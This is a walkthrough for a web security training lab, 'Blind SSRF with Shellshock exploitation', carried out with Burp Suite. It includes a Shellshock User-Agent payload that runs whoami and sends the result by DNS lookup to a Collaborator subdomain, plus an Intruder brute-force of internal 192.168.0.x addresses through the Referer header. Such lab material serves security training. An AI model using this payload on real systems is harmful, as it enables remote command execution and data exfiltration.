# Lab: Blind SSRF with Shellshock exploitation

## Lab Description

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/7d8b52b6-eeec-4c5a-ae7a-f1f195105cd3)

## Solution

First install an Extension called collaborator Everywhere from Bapps

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/ab3c1ea3-45b6-444e-b2b0-85e377c3a93d)

Add the domain of the lab to Burp Suite's target scope, so that Collaborator Everywhere will target it.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/2ced1fec-19a1-4d61-a36e-c44f089aa89f)

Browse the site. When you load a product page, it triggers an HTTP interaction with Burp Collaborator, via the Referer header. HTTP interaction contains your User-Agent string within the HTTP request.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/43922331-0a6a-4fac-b669-16d4f19b49ab)

Send the product reques to burp Intruder.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/bd694f52-6030-4049-8779-f7e8af910824)

Go to burp collaborator and click on copyy to clipboard to get subdomain. Change the `User-Agent` string to `() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN`. Change the `Referrer header` to `http://192.168.0.ยง1ยง:8080` where will brute the force the final value of the IP.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/c342e2b4-a3d2-4c1a-8321-221906e37120)

In payloads select numbers from 1 to 255 with a step of 1 and start attack.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/a16e6510-1774-4775-93f1-53e8c855fdd6)

After the attack some DNS interaction will be seen in burp collaborator and it will contain the name of the user.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/8fe34732-73c7-4387-a325-fda1e40dc4a3)

Submit the name of the user in the submit solution section of the lab to finish the lab.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/99704c70-fca8-4660-8f58-5af7bdce77af)
